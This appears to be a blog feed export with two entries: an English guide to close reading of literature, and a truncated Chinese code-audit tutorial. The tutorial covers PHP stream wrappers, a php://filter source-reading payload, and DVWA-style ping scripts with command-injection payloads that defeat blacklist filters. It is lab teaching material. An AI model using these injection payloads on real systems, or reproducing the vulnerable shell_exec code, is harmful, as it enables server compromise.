<p>Well, not exactly – though that’s the gist of what the poem shows us. But what if you looked more carefully; what if you were to reflect a little on what the poem might be suggesting. Noticing involves listening as well as looking, so try to hear the poem in your inner ear. In addition to rhyme, you will hear a metrical beat, a rhythm to the words in each line. You hear and feel the slow motion of the first line, as the first five syllables are all stressed. You hear the first line moving with difficulty while the second line skips along. And though the second line looks shorter than the first visually, it contains only one less syllable.</p>
<p>What might you make of these observations? You might ask yourself why the poet stresses heavily the words in the first line about the old dog, why he uses words with syllables that are hard to pronounce, and why he uses words and syllables that are easy to pronounce in the second line about the young pup. You might attend more carefully to the description of the old dog having difficulty getting up – barking ‘backward’ (a visual image). Doing so, you might notice the contrast between that difficult action and his movements as a pup. That youthful image is not given us by the poet, but it’s implied so that we might imagine it.</p>
<p>Finally, what do you notice about the poem’s title, ‘The Span of Life’? Has Frost given us in two brief lines an image and example of a life span – the life span of his dog? Yes, of course. But he gives us something more as well: he invites us to consider not just <em>a</em> span of life – the dog’s – but <em>the</em> span of life, which includes the span of life of the poem’s human speaker. After all, the speaker has aged, too, along with his dog. And though the dog ages faster, the speaker ages as well – ‘I can remember,’ he says. And so do we, especially if we have seen our own pets age and other people age, including ourselves.</p>
<p>In looking at and listening to Frost’s little poem together, we’ve been making observations about its words and sounds and images. And we’ve been raising questions about its meaning and significance. Those observations and questions lead us to see how these two aspects of writing are connected. As the English poet Alexander Pope wrote in 1711: ‘The sound must seem an echo to the sense.’</p>
<p><strong>Read more slowly</strong></p>
<p>Another way to deepen your appreciation and pleasure in literature is to <em>slow down</em>. You will benefit from a slow reading of longer, more ambitious works, just as you did with ‘The Span of Life’. Take your time with them. There’s no rush to finish; and there should be no rush to interpretation either. Take time to enjoy the way the writer presents his or her thinking, to reflect on what a work is saying to you, to mull over the insights you glean and to enjoy the writer’s craft and art.</p>
<p>When I’m reading something of interest and value, I will often limit myself to one chapter a day, for example, or perhaps 20 or 30 minutes of reading time followed by five or 10 minutes to think, reflect and jot notes and questions. Novels I love I read this way. An example: when I read George Eliot’s <em>Middlemarch</em> (1871-72), after a long day’s work, I allotted myself one hour per evening, late at night just before bedtime. In so doing, I lived in that 19th-century milieu for more than a month, soaking up and savouring the book’s country village atmosphere. Taking my time allowed me to digest Eliot’s psychological analysis of her characters, to revel in her complex plotting and her philosophical provocations to thinking. A little at a time. Easy as you go. Stretch out your reading pleasure.</p>
<p>In Henry David Thoreau’s <em>Walden</em> (1854), a book that profoundly influenced Mahatma Gandhi, we’re advised to read ‘deliberately’ – weighing and considering what we read. Thoreau suggests that we give to our reading of a work the same kind and degree of care that the author took in writing it, which in the case of <em>Walden</em> was seven drafts over nine years. ‘Books,’ he writes, ‘must be read as deliberately and reservedly as they were written.’ Now, I’m not suggesting you take nine years to read <em>Walden</em>. I am advocating, however, that you give such a finely crafted book the attention it deserves for both its content and its style. For example, consider this well-known sentence from Thoreau’s book, both for what it says and how it says it: ‘If a man does not keep pace with his companions, perhaps it is because he hears a different drummer. Let him step to the music which he hears, however measured or far away.’ Now that’s a provocative idea about individualism, couched in a pair of elegantly crafted sentences; they march to their own stately rhythm, and their beauty makes Thoreau’s idea memorable.</p>
<p><strong>Read aloud</strong></p>
<p>Yet another way to heighten your reading appreciation and understanding is to <em>read some parts of the text aloud</em> – a sentence or even an entire page. Reading Thoreau’s sentence aloud, for example, will help you notice things you’re likely to miss during silent reading. The ear (and voice) prompt the eye to see, absorb more of the writer’s craft and art. The art of reading and the craft of writing owe as much to the ear as to the eye. Before I invite you to read aloud a paragraph of prose fiction, I encourage you to return to Frost’s ‘The Span of Life’ and to read its two lines aloud. Why? Because I want you to feel in your body – in your mouth especially – as you speak the words aloud, how hard it is to speak the first line: ‘The old dog barks backward without getting up.’ Did you feel your tongue against your palate enunciating the Ds and Gs and hard CK sounds? Did you feel the stress on the first five syllables, and the sentence speed up afterwards?</p>
<p>Now feel in your mouth and on your lips and tongue how easily you can speak its second line: ‘I can remember when he was a pup.’ We form the consonants in this line with our lips. And for the R and W and ‘he’, we simply blow air through our mouths to pronounce. Hard versus easy. Old dog. Young pup. So re-read and read aloud for greater insight and pleasure.</p>
<p>Let’s now take up the prose example I promised you. The following paragraph concludes ‘The Dead’, the final story in <em>Dubliners</em> (1914), a collection of linked short stories by James Joyce:</p>
<blockquote>
<p>Yes, the newspapers were right: snow was general all over Ireland. It was falling on every part of the dark central plain, on the treeless hills, falling softly upon the Bog of Allen and, farther westward, softly falling into the dark mutinous Shannon waves. It was falling, too, upon every part of the lonely churchyard where Michael Furey lay buried. It lay thickly drifted on the crooked crosses and headstones, on the spears of the little gate, on the barren thorns. His soul swooned slowly as he heard the snow falling faintly through the universe and faintly falling, like the descent of their last end, upon all the living and the dead.</p>
</blockquote>
<p>Joyce’s description of the snow falling throughout Ireland is exquisite, a lyrical prose poem. I have shared this ending with hundreds of students, always inevitably succumbing, myself, to its sheer beauty of sound and rhythm. I hope you enjoyed the experience of reading the paragraph aloud – feeling its steady rhythm, hearing its repetition of ‘falling’, its echoing alliterations in ‘crooked crosses’ and ‘soul swooned slowly’, and Joyce’s nifty shift with the snow, first ‘falling softly’ and ‘softly falling’, and then ‘falling faintly and ‘faintly falling’.</p>
<p>These few observations about Joyce’s language touch on the tone and texture of the passage – the compassion it carries in those rhythms and repetitions. Joyce’s masterful prose needs to be read aloud to be fully appreciated. I hope you agree, and will add reading aloud to your repertoire of reading practices to deepen your pleasure.</p>
<p>NEED TO KNOWWHAT TO DOKEY POINTSLEARN MORELINKS &amp; BOOKS</p>
<h2 id="Key-points"><a href="#Key-points" class="headerlink" title="Key points"></a>Key points</h2><ul>
<li>Reading well will deepen your appreciation of literature; you’ll gain new experiences and enrich your knowledge of the world and other people.</li>
<li>Reading well requires noticing details, reflecting on them and questioning them.</li>
<li>One key to reading well and pleasurably is to slow down, take your time and read deliberatively.</li>
<li>Re-reading literary texts will allow you to pick up on what you missed the first time around and deepen your reading pleasure</li>
<li>Reading aloud, whether a sentence or an entire page, will help you notice more about a writer’s craft and art, especially how the tone and texture complement the meaning.</li>
</ul>
<p>NEED TO KNOWWHAT TO DOKEY POINTSLEARN MORELINKS &amp; BOOKS</p>
<h2 id="Learn-more"><a href="#Learn-more" class="headerlink" title="Learn more"></a>Learn more</h2><p><strong>Join me in a deep-reading experience</strong></p>
<p>To further demonstrate the rewards – of insight and pleasure, of understanding, experience and wisdom – to be reaped from reading literature well (by applying the strategies outlined in this Guide), I invite you to read along with me the opening paragraphs of a recent <a href="https://www.theatlantic.com/magazine/archive/2019/12/garry-winogrand-leslie-jamison/600805/">essay</a>, ‘A Street Full of Splendid Strangers’ (2019), by the American writer Leslie Jamison, originally published in <em>The Atlantic</em> magazine, and reprinted in André Aciman’s edited <a href="https://www.hmhbooks.com/shop/books/The-Best-American-Essays-2020/9780358358589">collection</a> <em>The Best American Essays</em> <em>2020</em>. Here is how Jamison begins her essay:</p>
<blockquote>
<p>When I was young, the beauty of church always belonged to other people: the believers. They saw the same stained glass I saw, but when its jewelled light cut their skin into kaleidoscopic colours, they somehow belonged in that light in a way I never would. They could feel the lilt and soar of the hymns as truth, as collective yearning, as a tin-can telephone connecting them to God. That’s what I told myself. I told myself I was alien to that beauty – I’d never be anything but an interloper lurking just outside its grace.</p>
</blockquote>
<p>Let’s begin with a few observations about the writer’s first sentence. Jamison immediately places us in church; she suggests that being in church can be uplifting for people – a beautiful experience – but that this experience is one she does not share. She emphasises this point with her last four words and her use of the colon. This experience of beauty, Jamison insists, belongs to ‘other people: the believers’. She feels somehow shut out from that experience. That’s a striking admission for jump-starting an essay. You might wonder, as I did, why that might be the case. Jamison answers our question later, but first she tells us what the experience is like for those ‘others’, providing us with vivid details so we can imagine what those ‘believers’ see and hear of beauty in church.</p>
<p>Ironically, she notes that she sees the same stained glass they see, describing vividly its ‘jewelled light’ and ‘kaleidoscopic colours’. In doing so, however, she separates herself from those other believers: ‘they somehow belonged’ Jamison writes, ‘in a way I never would’. Here, again, you might wonder why she doesn’t belong, and perhaps why she suggests that she not only doesn’t belong now, but that she doesn’t see herself as ever belonging, as ever being able to experience the beauty of church as believers do. We might surmise that it has something to do with belief – with faith – and that it is religious faith that separates Jamison from the believers and their more deeply emotional experience of the beauty they experience in church. We don’t know that, of course, but we might infer it, given the way Jamison distinguishes herself from the congregation of believers.</p>
<p>So far, we’re about halfway through that opening paragraph. Slowing down this way to notice and wonder – to ask questions – will likely get you thinking, not only about Jamison’s church experience, but also about your own. Jamison’s details – first visual, then aural – might well evoke the sights and sounds (and perhaps also the tastes and smells) of your own remembered church experiences. In this way, the act of reading is connected with your own life and past. Perhaps you share in the experiences Jamison imagines for the believers she describes or, conversely, perhaps you share Jamison’s experience of self-exclusion. Alternatively, maybe reflection on this passage and the questions it prompts have taken you in other directions entirely.</p>
<p>One of the most striking sentences in Jamison’s first paragraph is the third, the sentence about sounds, where she notes that those other believers could feel the rhythmic ‘lilt and soar of the hymns’. The hymns, she imagines, evoke feeling, emotion, for the believers, though not for Jamison, as she once again separates herself from the ‘truth’ and the ‘collective yearning’ she presumes those believers experience. That sentence about sounds and what they evoke in church, however, has something more in it – another detail: the ‘telephone connecting them to God’. Did you notice and wonder about Jamison’s use of the word ‘tin-can’ to describe the telephone?</p>
<p>What image does she conjure with that adjective? What tone do you hear in that word? A little disdain, perhaps?</p>
<p>We’re undertaking here with this passage what we did earlier in this Guide, as we noticed textual details and raised questions about them, as we slowed down our reading and re-read some sentences, and as we read aloud.</p>
<p>The last two sentences of Jamison’s opening paragraph pivot to what she told herself.</p>
<p>She uses that phrase twice, for emphasis. And what Jamison tells herself is that she’s an ‘interloper’, an ‘alien’ presence, who does not, cannot, and will never share the experience of beauty that the church’s believers possess, noting that she lurks ‘just outside its grace’.</p>
<p>And what a word that is, ‘grace’, to conclude a paragraph about the beauty experienced in church. It’s a loaded word, one appropriate in the context of religious belief and churchgoing, and one that captures well what Jamison is missing, how she lacks the benevolent gift of grace. As you read this concluding sentence, and as you mull over the significance of what Jamison is suggesting in her first paragraph overall, you might wonder where she will go next with her essay. You might wonder whether there could be some other form of grace available to her.</p>
<p>Here is how Jamison continues in her second paragraph:</p>
<blockquote>
<p>Some version of that girl I’d been in church – with legs too long for her denim overalls, and palms covered with half-moon crescents where she’d dug her nails into her skin – was summoned for a different rapture, years later, by the photography of Garry Winogrand. Some version of that girl was told: <em>This is beauty you belong in</em>. The first time I entered the Brooklyn Museum’s 2019 exhibit of his colour photography, part of its force was this immediate sense of invitation, as if a door had been carved in a wall, leading to some new world, and now I could cross into it – or perhaps simply see more clearly that I’d been living in that miraculous world all along. It had only disguised itself as something familiar, or banal.</p>
</blockquote>
<p>Let’s note, first, the splendid, vivid details of that long opening sentence, the description heightened by being sandwiched between the double dashes. Let’s observe, too, how Jamison takes herself and us to another place – to the Brooklyn Museum, a different kind of sublime space, one in which Jamison, and we, can experience beauty unconnected to church and religious faith. Let’s remark, too, on Jamison’s choice of being ‘summoned’, to something she can’t resist, and her choice of ‘rapture’, a word rich in both spiritual and sensual connotations. Jamison feels a special but different kind of grace is something that can be hers, and you might notice that this transcendent experience of beauty is occasioned by an exhibition of colour photographs, an echo perhaps of the church’s coloured stained glass.</p>
<p>Jamison reserves, for the last part of the paragraph, a series of striking images that capture her sense of the splendour and grandeur of seeing Winogrand’s photographs. She concludes the paragraph with the stunning idea that the ‘miraculous world’ Winogrand’s photographs create has been there all along – in the everyday world that Jamison, and we, inhabit. It’s just that she and we haven’t noticed its beauty, and that it takes an artist like Winogrand to open our eyes and hearts and minds to its hidden-in-plain-sight glory. A final irony is that the miraculous beauty Winogrand captures, and that Jamison describes, has not only been available all along, but that it is ‘familiar’, ‘banal’ even. Beauty lurks where we least expect to find it. Glory reveals itself to us in seemingly ordinary moments – if we know where to find it, how to see in those moments an astonishing, luminous radiance.</p>
<p>Are you curious as to what Jamison saw at the exhibition of Winogrand’s photography? Here is a sampling of the pictures she describes in her essay:</p>
<blockquote>
<p>A woman propped on her elbows on her beach towel, a messy MICKEY stick-and-poke tattoo on her arm, cat’s-eye sunglasses hiding her mood. A man lying on his back, with his blue-canvas sneakers tucked beside him and the sunlight pouring across his body, the cigar in his mouth pointed straight up toward the sky … a family having a picnic against a backdrop of rolling white sand dunes; street clowns at a parade beneath a sign advertising DALLAS’ FINEST HAMBURGERS; flight attendants in their powder-blue suits, clustered on an asphalt divider, shadowed by palm trees and boxy, off-white airport hotels.</p>
</blockquote>
<p>What’s especially interesting about the Winogrand photography exhibit is that his pictures were slides that rotated every eight seconds for the horizontal images and every 13 seconds for the vertical images. Viewers observed them more than once, a little at a time, and always in relation to different images appearing on the museum walls. Jamison characterises her experience of the moving images as ‘a tutorial in the proximity of the sacred’, a phrase that takes us back to the notion of ‘grace’ with which she began her essay. Her ‘tutorial’ teaches us to think about what ‘grace’ and the ‘sacred’ might mean for us and how they might manifest in our lives.</p>
<p>Reading with this degree of attention and care brings benefits beyond compare. Reading literary works, including Jamison’s essay, in this way affords some of the same experiences for which Jamison reads and celebrates Winogrand’s photographs: for the shared feelings they evoke, for a sense of other people’s humanity, for a sense of what others care about, for a glimpse of what they do and make and love. Reading literature disciplines us, strengthens our powers of focus, aids our capacity for noticing, prompts our inclination to ask questions and to make connections. Making a habit of reading slowly, carefully, deliberately a work like Jamison’s essay will enable you to participate in a provocative and engaging conversation that leads your thinking in directions you couldn’t have imagined before you started. I invite you to read the rest of Jamison’s splendid essay, which you can find online or in <em>The Best American Essays 2020</em> collection; below, I’ve provided some more suggestions for deeper reading.</p>
<p>NEED TO KNOWWHAT TO DOKEY POINTSLEARN MORELINKS &amp; BOOKS</p>
<h2 id="Links-amp-books"><a href="#Links-amp-books" class="headerlink" title="Links &amp; books"></a>Links &amp; books</h2><p>A few suggestions for deepening your reading pleasure, starting with books then moving on to my recommendations for literary book clubs and podcasts:</p>
<p>I hope my own <a href="https://press.princeton.edu/books/hardcover/9780691206783/you-are-what-you-read">book</a> <em>You Are What You Read</em> (2021) will make you want to read, especially literature. Offering guidance and advice, I demonstrate what engaged, productive reading looks like and feels like through questioning literary works, seeking their embodied truths, discovering their dialectical energies, and engaging with the minds and hearts of writers.</p>
<p>Martin Puchner’s <a href="http://www.randomhousebooks.com/campaign/the-written-world/">book</a> <em>The Written World</em> (2017) is a tour de force that explains how major literary works inscribe the cultures they embody and influence the values those cultures sustain. Through 16 foundational texts from more than 4,000 years of world literature, the author explains how writing has inspired the rise and fall of empires and nations, sparked philosophical and political debates, and led to the emergence of religious beliefs.</p>
<p>Will Schwalbe’s <a href="https://www.penguinrandomhouse.com/books/239719/books-for-living-by-will-schwalbe/">guide</a> <em>Books for Living</em> (2016) offers a celebration of reading in general and an impassioned recommendation of books to shepherd us through our daily lives. He explains why he cherishes each book he discusses, how it helped him in living his own life, and how it broadened and deepened his understanding of the world.</p>
<p>Alberto Manguel’s <a href="https://yalebooks.yale.edu/book/9780300172089/reader-reading">book</a> <em>A Reader on Reading</em> (2011) argues that the activity of reading, in its broadest sense, defines our species. In reading the words on our pages and screens, we enter the worlds they describe and embrace. Topics include the connection between books and our bodies, the power of censorship, the art of translation, and more. Books, contends Manguel, lend coherence to our world and our lives.</p>
<p>The online <a href="https://www.peirenepress.com/borderless-book-club/">series</a> the Borderless Book Club was established by several small European publishing houses to discuss translated literature. In a fortnightly Zoom meeting that can be accessed by anyone, anywhere in the world, the publishers take turns to present a book from their catalogues, and authors and translators are invited to discuss their work. In addition, the selected titles are sometimes discounted.</p>
<p>The Silent Book Club was <a href="https://silentbook.club/">founded</a> in 2012 by two friends in San Francisco, Guinevere de la Mare and Laura Gluhanich, ‘to get out of the house and meet up with a group – and not be forced to make awkward happy-hour conversation, but to sit quietly for an hour and then chat about books,’ de la Mare says. Since then, the club has grown to 260 chapters around the world in 31 countries, providing a place for people ‘to gather in person and online to read together in quiet camaraderie’.</p>
<p>The Literary Friction <a href="https://www.nts.live/shows/literaryfriction">podcast</a> is a conversation about books and ideas, hosted by another two friends, Carrie Plitt in Oxford and Octavia Bright in London. Each month, they interview an author about their book and build the show around a related theme – anything from resistance to coastlines to corpses. Listen in for lively discussion, book recommendations and a little music too.</p>
<p>Finally, I recommend the <a href="https://podcasts.apple.com/gb/podcast/on-the-road-with-penguin-classics/id1549179379">podcast</a> On the Road with Penguin Classics in which the team takes a stroll around the world’s favourite books. Hosted by the writer and editor Henry Eliot, <a href="https://www.penguin.co.uk/books/307215/the-penguin-classics-book/9780241320853.html">author</a> of <em>The Penguin Classics Book</em> (2018), each week the podcast heads to a different literary location to explore a book in the company of readers.</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计-初篇</title>
    <url>/2020/05/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%88%9D%E7%AF%87/</url>
    <content><![CDATA[<h1 id="PHP中支持的伪协议"><a href="#PHP中支持的伪协议" class="headerlink" title="PHP中支持的伪协议"></a>PHP中支持的伪协议</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>

<span id="more"></span> 

<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><blockquote>
<p>php://filter在双off的情况下也可以正常使用；<br>条件：<br><strong>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</strong></p>
</blockquote>
<p><strong>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</strong></p>
<p>php://filter</p>
<p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>

<p>payload: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=./1.txt</span><br></pre></td></tr></table></figure>



<p>php://input</p>
<p>php://input代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。</p>
<p>比较特殊的一点，enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<p>php://output</p>
<p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>准备材料<br>； - 分号在linux命令执行的时候，可以直接执行几条命令，命令与命令之间用分号隔开</p>
<p>&amp; 前面的命令执行后接着执行候命的命令</p>
<p>&amp;&amp; 前面的命令执行成功后才可以执行下面的命令</p>
<p>| 前面的命令输出结果做为后面命令输入的内容</p>
<p>|| 前面的命令执行失败后才会执行后面的命令</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">	// Determine OS and execute the ping command.</span><br><span class="line">	if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">		// Windows</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// *nix</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Feedback for the end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>先判断是否得到了一个提交的参数，然后，将IP地址赋予target参数</p>
<p>再判断是否为Windows系统，如果是win则执行第一个命令，如果不是就在命令加上-c选项，因为linux什么的操作系统中ping命令是一直执行的。只有加了-c指定发送的跳数才能停止</p>
<p>可以确定的是，完全没有添加防护措施，那就简单了，直接随便用一个吧（见0x00）</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sdbet || ipconfig</span><br></pre></td></tr></table></figure>



<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">	// Set blacklist</span><br><span class="line">	$substitutions = array(</span><br><span class="line">		&#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	// Remove any of the charactars in the array (blacklist).</span><br><span class="line">	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">	// Determine OS and execute the ping command.</span><br><span class="line">	if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">		// Windows</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// *nix</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Feedback for the end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>其他地方和上一个差不多，唯一不同的就是，它将&amp;&amp;和；变成了数组中的元素，再通过str_replace函数，进行空格替换，从而顾虑了&amp;&amp;和；，但没关系，又不是只有那两个字符串。</p>
<p>涉及函数：</p>
<p>[array_keys][<a href="https://www.runoob.com/php/func-array-keys.html]">https://www.runoob.com/php/func-array-keys.html]</a></p>
<p>[str_replace][<a href="https://www.w3school.com.cn/php/func_string_str_replace.asp]">https://www.w3school.com.cn/php/func_string_str_replace.asp]</a></p>
<p>paylaod:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure>



<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$target = trim($_REQUEST[ &#x27;ip&#x27; ]);</span><br><span class="line"></span><br><span class="line">	// Set blacklist</span><br><span class="line">	$substitutions = array(</span><br><span class="line">		&#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	// Remove any of the charactars in the array (blacklist).</span><br><span class="line">	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">	// Determine OS and execute the ping command.</span><br><span class="line">	if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">		// Windows</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// *nix</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Feedback for the end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>很聪明，直接过滤掉了所有可能的连接符，但只做了一次防护，反之，过滤了第一次后，那剩下的连接符就连接起来咯</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;||&amp; ipconfig</span><br></pre></td></tr></table></figure>



<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Check Anti-CSRF token</span><br><span class="line">	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">	// Get input</span><br><span class="line">	$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">	$target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">	// Split the IP into 4 octects</span><br><span class="line">	$octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">	// Check IF each octet is an integer</span><br><span class="line">	if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">		// If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">		$target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">		// Determine OS and execute the ping command.</span><br><span class="line">		if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">			// Windows</span><br><span class="line">			$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			// *nix</span><br><span class="line">			$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Feedback for the end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// Ops. Let the user name theres a mistake</span><br><span class="line">		$html .= &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>explode() 函数把字符串打散为数组</p>
<p>stripslashes删除反斜杠</p>
